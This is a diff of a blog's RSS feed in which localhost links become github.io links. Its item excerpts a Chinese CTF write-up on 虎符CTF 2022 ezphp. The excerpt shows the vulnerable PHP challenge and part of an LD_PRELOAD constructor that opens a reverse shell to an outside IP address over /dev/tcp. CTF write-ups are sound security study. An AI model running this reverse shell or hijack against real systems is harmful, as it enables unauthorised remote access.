@@ -2,23 +2,23 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Nginx临时文件上传 on J1rrY&#39;s Blog</title>
-    <link>http://localhost:1313/tags/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
+    <link>http://j1rry-learn.github.io/tags/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
     <description>Recent content in Nginx临时文件上传 on J1rrY&#39;s Blog</description>
     <image>
       <title>J1rrY&#39;s Blog</title>
-      <url>http://localhost:1313/</url>
-      <link>http://localhost:1313/</link>
+      <url>http://j1rry-learn.github.io/</url>
+      <link>http://j1rry-learn.github.io/</link>
     </image>
-    <generator>Hugo -- 0.139.1</generator>
+    <generator>Hugo -- 0.143.0</generator>
     <language>zh</language>
     <copyright>©2025 J1rrY&amp;rsquo;s Blog</copyright>
     <lastBuildDate>Sun, 11 Aug 2024 12:30:00 +0000</lastBuildDate>
-    <atom:link href="http://localhost:1313/tags/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://j1rry-learn.github.io/tags/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>虎符CTF 2022 ezphp</title>
-      <link>http://localhost:1313/posts/%E8%99%8E%E7%AC%A6ctf-2022-ezphp/</link>
+      <link>http://j1rry-learn.github.io/posts/%E8%99%8E%E7%AC%A6ctf-2022-ezphp/</link>
       <pubDate>Sun, 11 Aug 2024 12:30:00 +0000</pubDate>
-      <guid>http://localhost:1313/posts/%E8%99%8E%E7%AC%A6ctf-2022-ezphp/</guid>
+      <guid>http://j1rry-learn.github.io/posts/%E8%99%8E%E7%AC%A6ctf-2022-ezphp/</guid>
       <description>&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45619909/article/details/128946735&#34;&gt;https://blog.csdn.net/qq_45619909/article/details/128946735&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;考点:nginx临时文件上传+LD_PROLOAD劫持&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;env&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;putenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;env&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;echo hfctf2022&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
@@ -33,7 +33,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;bash -c &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/148.135.82.190/8888 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;__attribute__((constructor))&lt;/code&gt;指在main函数之前,执行一个函数,便于我们做一些准备工作，即我们定义了一个叫做preload的无参数无回显的预编译函数
-使用以下命令编译生成&lt;a href=&#34;https://so.csdn.net/so/search?q=so%E6%96%87%E4%BB%B6&amp;spm=1001.2101.3001.7020&#34;&gt;so文件&lt;/a&gt;&lt;/p&gt;</description>
+使用以下命令编译生成&lt;a href=&#34;https://so.csdn.net/so/search?q=so%E6%96%87%E4%BB%B6&amp;amp;spm=1001.2101.3001.7020&#34;&gt;so文件&lt;/a&gt;&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
